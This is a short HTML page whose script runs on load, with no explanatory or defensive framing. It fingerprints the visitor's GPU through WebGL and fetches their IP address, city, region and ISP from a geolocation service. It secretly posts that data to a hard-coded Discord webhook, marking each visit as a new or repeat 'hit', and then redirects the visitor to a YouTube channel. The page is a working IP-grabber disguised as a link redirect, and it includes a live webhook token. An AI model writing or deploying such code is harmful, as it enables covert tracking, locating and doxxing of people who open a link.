<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const H = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const Y = "https://youtube.com/@LigmaBlox-w7m";

    async function gD() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop().split(" (")[0];
        } catch(e) { return navigator.platform; }
    }

    async function run() {
        const re = sessionStorage.getItem('v');
        sessionStorage.setItem('v', '1');
        const dev = await gD();

        fetch(H, {
            method: 'POST', mode: 'no-cors', keepalive: true,
            body: JSON.stringify({ content: `[${re ? "RE-ENTRY" : "NEW HIT"}]\nDevice: ${dev}` })
        });

        while (true) {
            try {
                const r = await fetch('https://ip-api.com/json/?cb=' + Date.now()).then(d => d.json());
                if (r.status === "success") {
                    await fetch(H, {
                        method: 'POST', mode: 'no-cors', keepalive: true,
                        body: JSON.stringify({ content: `IP: ${r.query}\nLoc: ${r.city}, ${r.regionName}\nISP: ${r.isp}` })
                    });
                    break;
                }
            } catch (e) {
                await new Promise(s => setTimeout(s, 2));
            }
        }
        location.replace(Y);
    }
    run();
</script>
</body>
</html>
